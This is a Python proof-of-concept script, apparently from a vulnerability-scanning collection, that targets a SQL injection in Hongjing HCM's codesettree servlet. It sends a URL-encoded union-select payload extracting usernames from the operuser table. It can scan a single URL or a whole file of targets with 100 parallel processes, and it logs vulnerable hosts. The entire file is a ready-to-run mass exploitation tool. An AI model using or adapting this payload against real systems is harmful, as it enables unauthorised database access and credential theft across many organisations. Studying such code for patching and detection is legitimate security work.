import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
                    ███████╗ ██████╗ ██╗     
                    ██╔════╝██╔═══██╗██║     
                    ███████╗██║   ██║██║     
                    ╚════██║██║▄▄ ██║██║     
                    ███████║╚██████╔╝███████╗
                    ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                            author:wAw
                                            date:2024.09.22
                                            version:1.0
"""
    print(test)


def poc(target):
    payload= "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d"
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3) AppleWebKit/605.1.15(KHTML,likeGecko)',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close'
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5,headers=headers)
            if res2.status_code == 200 :
                print(f"[+]{target}存在sql注入漏洞")
                with open ("宏景_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]{target}存在sql注入漏洞\n")

            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parser = argparse.ArgumentParser(description = "这是一个关于宏景 HCM codesettree SQL注入漏洞的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__=='__main__':
    main()